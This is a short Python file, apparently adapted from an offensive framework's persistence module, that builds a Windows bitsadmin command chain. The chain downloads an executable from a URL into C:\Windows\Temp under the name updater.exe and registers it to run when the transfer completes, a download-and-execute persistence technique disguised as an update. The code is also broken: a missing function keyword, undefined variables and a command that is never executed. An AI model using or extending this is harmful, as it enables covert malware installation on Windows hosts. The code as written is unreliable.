#!/usr/bin/env python
'''
	Inspired by  Veil Pillage
		https://github.com/Veil-Framework/Veil-Pillage/blob/master/modules/persistence/bitsadmin.py
	
	'''

class bitsAdmin:
    
	bitskdrop(self, url, job_name):
        cmd = "bitsadmin /create "+job_name+" & bitsadmin /addfile "+job_name+" "+exe_url+" C:\Windows\Temp\updater.exe & bitsadmin /SETNOTIFYCMDLINE "+job_name+" C:\Windows\Temp\updater.exe NULL & bitsadmin /SETMINRETRYDELAY "+job_name+" "+str(int(interval)*60) + " & bitsadmin /resume "+job_name


if __name__ == "__main__":
    dirtyBit = bitsAdmin()
    dirtyBit.bitskdrop("http://www.google.com", JavaOfficeUpdater)
